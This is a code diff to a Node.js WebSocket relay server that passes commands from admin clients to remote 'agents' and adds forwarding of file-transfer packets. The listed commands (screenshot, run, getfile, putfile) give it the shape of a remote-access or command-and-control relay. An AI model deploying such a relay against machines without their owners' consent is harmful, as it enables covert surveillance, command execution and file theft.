@@ -31,12 +31,14 @@ const admins = new Set(); // Set<ws>
 
 // helpers
 function sendJson(ws, obj) {
-  try { ws.send(JSON.stringify(obj)); } catch (e) {}
+  try { ws.send(JSON.stringify(obj)); } catch {}
 }
 function broadcastAdmins(obj) {
   const s = JSON.stringify(obj);
   for (const a of admins) {
-    if (a.readyState === WebSocket.OPEN) try { a.send(s); } catch {}
+    if (a.readyState === WebSocket.OPEN) {
+      try { a.send(s); } catch {}
+    }
   }
 }
 function parseQS(url) {
@@ -50,7 +52,11 @@ function installHeartbeat(ws) {
   ws.on("pong", () => (ws.isAlive = true));
 }
 setInterval(() => {
-  for (const ws of [...admins, ...[...agents.values()].map(x => x.ws)]) {
+  const all = [
+    ...admins,
+    ...Array.from(agents.values()).map(x => x.ws)
+  ];
+  for (const ws of all) {
     if (!ws) continue;
     if (ws.isAlive === false) { try { ws.terminate(); } catch {} continue; }
     ws.isAlive = false;
@@ -76,13 +82,34 @@ wss.on("connection", (ws, req) => {
 
     ws.on("message", (buf) => {
       let msg; try { msg = JSON.parse(buf.toString()); } catch { return; }
+
       if (msg.type === "hello") {
         ws.agentId = msg.agentId || ("agent-" + Math.random().toString(36).slice(2, 8));
         agents.set(ws.agentId, { ws, info: msg });
         broadcastAdmins({ type: "agent_list", agents: [...agents.keys()] });
+
       } else if (msg.type === "resp") {
-        // forward raw response to all admins (your VB admin filters by agentId if needed)
+        // forward raw response to admins
         broadcastAdmins({ type: "resp", agentId: ws.agentId, payload: msg });
+
+      } else if (msg.type === "file") {
+        // NEW: forward file transfer packets as top-level fields (no payload wrapper)
+        // Admin app expects: {type:"file", agentId, id, mode, name?, size?, seq?, data?, sha256?}
+        broadcastAdmins({
+          type: "file",
+          agentId: ws.agentId,
+          id: msg.id,
+          mode: msg.mode,
+          name: msg.name,
+          size: msg.size,
+          seq: msg.seq,
+          data: msg.data,
+          sha256: msg.sha256
+        });
+
+      } else if (msg.type === "error") {
+        // optional: surface agent-side errors to admins
+        broadcastAdmins({ type: "error", agentId: ws.agentId, message: msg.message || "agent error" });
       }
     });
 
@@ -104,7 +131,7 @@ wss.on("connection", (ws, req) => {
 
     ws.on("message", (buf) => {
       let msg; try { msg = JSON.parse(buf.toString()); } catch { return; }
-      // expected: {type:'cmd', id:'uuid', cmd:'screenshot'|'run'|'getinfo', target:'agentId', ...}
+      // expected: {type:'cmd', id:'uuid', cmd:'screenshot'|'run'|'getinfo'|'getfile'|'putfile_*'|..., target:'agentId', ...}
       if (msg.type === "cmd" && msg.target && msg.cmd) {
         const entry = agents.get(msg.target);
         if (entry && entry.ws.readyState === WebSocket.OPEN) {
